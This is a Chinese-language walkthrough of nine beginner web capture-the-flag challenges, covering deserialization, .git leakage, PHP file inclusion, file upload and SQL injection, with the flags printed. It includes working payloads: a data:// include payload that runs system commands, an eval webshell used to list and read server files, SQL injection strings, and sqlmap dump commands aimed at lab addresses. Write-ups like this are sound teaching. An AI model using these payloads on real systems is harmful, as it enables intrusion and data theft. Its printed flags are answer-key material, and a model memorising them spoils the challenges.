---
创建: 2025-09-16
tags:
---

# 目录  ^toc

- [[#目录  ^toc|目录]]
- [[#题目|题目]]
	- [[#1 can_you_catch_img|1 can_you_catch_img]]
	- [[#2 transfer_money|2 transfer_money]]
	- [[#3 ez_rand|3 ez_rand]]
	- [[#4 ez_unser|4 ez_unser]]
	- [[#5 know_git|5 know_git]]
	- [[#6 ez_include|6 ez_include]]
	- [[#7 ez-upload|7 ez-upload]]
	- [[#8 ez_sql|8 ez_sql]]
	- [[#9 pro_sql|9 pro_sql]]

# 题目

## 1 can_you_catch_img

提示了点击图片可能会弹出 flag，但尝试点击会发现图片会逃跑。
![[ctf体验工坊web题解-250916-134742.png]]

这里我们直接打开 `devTools`，然后阅读前端代码；找到这一段，我在注释里也写了这是获取 `flag` 的逻辑。
![[ctf体验工坊web题解-250916-134816.png]]

这段逻辑就是把 `secret` 密文 `base64` 解码再和 `key` 进行异或运算，最后返回异或运算的结果为 `flag`，并用 `alert()` 弹出弹窗。

我们可以按照上述逻辑手动解密，但更方便的是直接把这段代码复制到 `devTools` 的控制台中运行，就能得到 `flag`
![[ctf体验工坊web题解-250916-135152.png]]

```flag
Cd1gger{41969f05-678e-e4e7-6dcc-678d75460450}
```

## 2 transfer_money

先注册 `as` 和 `zs` 两个账号 (用户名随意)
![[ctf体验工坊web题解-250916-135514.png]]

登录后进入主界面
![[ctf体验工坊web题解-250916-135615.png]]

直接购买 `flag` 显然没有余额
![[ctf体验工坊web题解-250916-135652.png]]

由于后端转账处理没有做严格的判断，给 `zs` 用户转账赋值，我们自己的余额就会增加
![[ctf体验工坊web题解-250916-135732.png]]

然后成功购买到 `flag`
![[ctf体验工坊web题解-250916-135757.png]]

```flag
Cd1gger{78e3ca3c-98f4-467d-910d-8a0af2e72a4a}
```

## 3 ez_rand

前端页面很简单，就是输入口令获取 `flag`
![[ctf体验工坊web题解-250916-140032.png]]

但这题给了源码作为附件
![[ctf体验工坊web题解-250916-140200.png]]

这里用到的知识是，对于 `c` 语言的 `rand()` 伪随机数函数，如果随机数种子 `srand(<seed>)` 固定了，那么每次运行程序，我们依次调用 `rand()` 函数生成的随机数值对应相等。

比如说，在一个 `c` 程序中，使用 `srand(20051006)` 设置了随机数种子，然后这个程序调用了四次 `rand()` 生成了 4 个随机数值；那么使用相同的编译器，每次编译运行生成的随机数值都是这 4 个值，不会改变。

而附件源码中给的注释已经很详细，就是一开始设置了随机数种子，然后生成四个随机数拼在一块作为 `pin` 口令。

我们直接把源码的 `generatePin()` 函数复制下来，然后用 `srand(20051006);` 设置随机数种子，最后调用 `generatePin(4)` 生成 `pin`

```cpp
#include <iostream>
#include <string>
#include <stdlib.h>

std::string generatePin(int n) {
  std::string pin;
  for (int i = 0; i < n; ++i) {
    pin += std::to_string(rand() % 10000);
    if (i < n - 1)
      pin += '-';
  }
  return pin;
}

int main() {
  srand(20051006);
  std::cout << generatePin(4) << std::endl;
}
```

然后编译运行 (按照附件中的说明，没有 linux glibc 环境的可以用说明中提供的在线网站运行代码)
![[ctf体验工坊web题解-250916-141050.png]]

然后输入口令获得 `flag`
![[ctf体验工坊web题解-250916-141103.png]]

```flag
Cd1gger{5f969695-0a8f-4594-b8a9-1152a961b68a}
```

## 4 ez_unser

这题是直接回显源码的，给了一个类，他的 *析构函数* 里面能够输出 `flag`；只需要 `name` 属性为 `ctf` 即可
![[ctf体验工坊web题解-250917-140533.png]]

然后 `unserialize` 接收前端传来的 *查询字符串*，将其反序列化为对象。

如果这个对象是 `NSS` 类的实例，那么这个对象在析构的时候就会触发 `__destruct` 析构函数；这时，如果它的 `name` 属性刚好是 `ctf`，就会输出 `flag`

因此，我们只需要序列化一个符合上述要求的对象，将序列化后的字符串传递给后端；后端接收到后在将字符串反序列化为对象，经过上述逻辑，就会输出 `flag`。

```php
<?php
class NSS {
  var $name = 'ctf';
}

echo serialize(new NSS());
```

## 5 know_git

只有一句提示
![[ctf体验工坊web题解-250916-141620.png]]

用目录扫描工具扫描一下，可以扫到一堆 `./git/` 目录下的文件，也就对应了提示的那句 `.git` 忘记删除了。

```shell
dirsearch -u http://localhost:85/
```

![[ctf体验工坊web题解-250916-141850.png]]

`git` 是一个优秀的版本控制工具，几乎在所有工程化项目中都能看到他的身影。
顾名思义，它是用来控制项目版本的，可以想象成游戏的存档。

如果在部署 `web` 项目时，没有把静态目录中的 `.git` 目录删掉或排除，攻击者就能够通过获取 `.git` 目录中内容，恢复并查看到项目以前的版本中的内容。如果以前版本中有已经在新版本被删除的敏感信息，就会造成泄露。

理论上，我们需要了解 `.git/` 目录中是如何存储旧版本内容的，然后根据这个规则去远程下载各个文件，最后根据规则去还原出就文件；但这样无疑很麻烦。

这里有个实用的工具可以从 `web` 服务暴露出的 `http://url/path/to/.git/` 目录中提取出我们需要的文件。
因此我们用工具解题

```shell
git clone git@github.com:lijiejie/GitHack.git && cd .\GitHack\
python GitHack.py http://localhost:85/.git/
```

![[ctf体验工坊web题解-250916-143514.png]]

![[ctf体验工坊web题解-250916-143557.png]]

```shell
Cd1gger{e9fb1877-b95c-4a10-9d84-fb7254bf0ce0}
```

下面贴一个探索 `git` 是如何存储各版本文件的过程，感兴趣可以看看

![[web工坊-入门#5.1 `.git` 的目录结构]]

## 6 ez_include

直接给了源码
![[ctf体验工坊web题解-250916-144009.png]]

注释中提示了 `flag` 在 `$FLAG` 环境变量里，在 `shell` 中可以用 `echo $FLAG` 输出。

这段代码很简单，就是获取 `http://url/?file=<xxx>` 的 `<xxx>` 部分作为 `$_GET['file']` 值 (即文件名)，然后 `include` 它作为 `php` 执行。

我们的目的是能够执行系统命令，而它这里只给了 `include` 包含已有的 `php` 文件，该怎么做呢？

其实，可以用 `data` 伪协议；简单来说，`php` 伪协议可以用在 `php` 中大多数能够填写文件名的地方，可以简单理解为 `php` 伪协议可以允许把某些东西当作文件访问。

多说无益，直接上 `payload`

```
?file=data://text/plain,<?php system('echo $FLAG');?>
```

我们用 `data://text/plain,<?php system('echo $FLAG');?>` 作为文件名，就相当于 `include` 了一个内容为 `<?php system('echo $FLAG');?>` 的文件，也就直接执行了我们给的 `php` 代码，执行了系统命令 `ehco $FLAG`，输出了 `flag`。

![[ctf体验工坊web题解-250916-144801.png]]

```flag
Cd1gger{c3828c2c-0d0d-4786-839c-fc767bab1393}
```

## 7 ez-upload

这题给了一个上传文件的按钮
![](https://cdn.nlark.com/yuque/0/2025/png/49203299/1744547801447-43a3c82a-93cf-42ce-86ea-952b1008bb2f.png)

因此我们需要上传一个 php 木马文件，然后访问这个木马文件的路径。由于我们上传的是 php 文件，所以服务器并不会把它当成资源文件 (html css js 媒体文件) 直接返回，而是会执行这个文件

我们编辑如下木马文件
![](https://cdn.nlark.com/yuque/0/2025/png/49203299/1744547874217-e10d6105-c39e-405b-91c5-9186de33f970.png)

> 木马内容为，接收从客户端传来的 *查询字符串参数* `1`，把它交给 `eval()` 函数执行。而 `eval()` 的作用是执行任意 `php` 代码，这样我们就相当于有了在服务器执行代码的后门

然后上传它
![](https://cdn.nlark.com/yuque/0/2025/png/49203299/1744547923462-909654a3-06c5-4466-bee5-32fa9e9068d9.png)

在返回的信息中，我们主要看这个路径，访问它，并附带有 `查询字符串` 参数，让服务器执行我们的 `php` 代码。

先是执行 `system('ls /');` 输出一下服务器根目录的文件
![](https://cdn.nlark.com/yuque/0/2025/png/49203299/1744548066119-4927d94b-e57a-4afe-b753-1a9f102518ce.png)

看到 `flag` 文件后，用 `system('cat /flag');` 输出一下这个文件
![](https://cdn.nlark.com/yuque/0/2025/png/49203299/1744548031344-c133b6c3-e4ee-49dd-aa88-bc2f2c3c8fb9.png)

## 8 ez_sql

一个登录框，登录成功就能获得 `flag`
![[ctf体验工坊web题解-250917-144238.png]]

我们随便输一个密码试试，提示登录失败。但是它下面打印了 `sql` 语句
![[ctf体验工坊web题解-250917-144307.png]]

根据打印的 `sql` 语句，我们可以构造 `123' or '1'='1`，这样原来的 `sql` 语句就变成了：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123' or '1'='1' LIMIT 1
```

这样前面 `passwd` 的条件就被 `or` 或运算符给忽略了，也就能通过登录验证了。

## 9 pro_sql

这题是输入一个用户 `id` ，然后给你返回用户信息
![[ctf体验工坊web题解-250917-142227.png]]

我们也可以用万能密码的套路输出所有用户，但输出的信息中没有我们要的内容
![[ctf体验工坊web题解-250917-142323.png]]

上图左边贴的 `sql` 语句显示，它是从 `users` 表中读的数据；既然这个表没有数据，我们就要查其他表。

这里我们用 `sqlmap`，它能够方便的执行 `sql` 注入，不用我们手动构造 `sql` 语句。

先查数据库，查出来四个库，其中 `ctf` 库比较可疑

```shell
sqlmap -u 'http://172.16.200.26:33191/?id=1' --batch --dbs
```

![[ctf体验工坊web题解-250917-142014.png]]

我们输出一下 `ctf` 库的表

```shell
sqlmap -u 'http://172.16.200.26:33191/?id=1' --batch -D ctf --tables
```

可以看到 `users` `flag` 两个，`users` 表我们刚刚看过了；这边看一下 `flag` 表。
![[ctf体验工坊web题解-250917-142034.png]]

输出 `flag` 表的字段

```shell
sqlmap -u 'http://172.16.200.26:33191/?id=1' --batch -D ctf -T flag --columns
```

然后看到 `data` 字段比较可疑
![[ctf体验工坊web题解-250917-142109.png]]

输出 `data` 字段的内容

```shell
sqlmap -u 'http://172.16.200.26:33191/?id=1' --batch -D ctf -T flag -C data --dump
```

然后就看到 `flag` 了
![[ctf体验工坊web题解-250917-142151.png]]
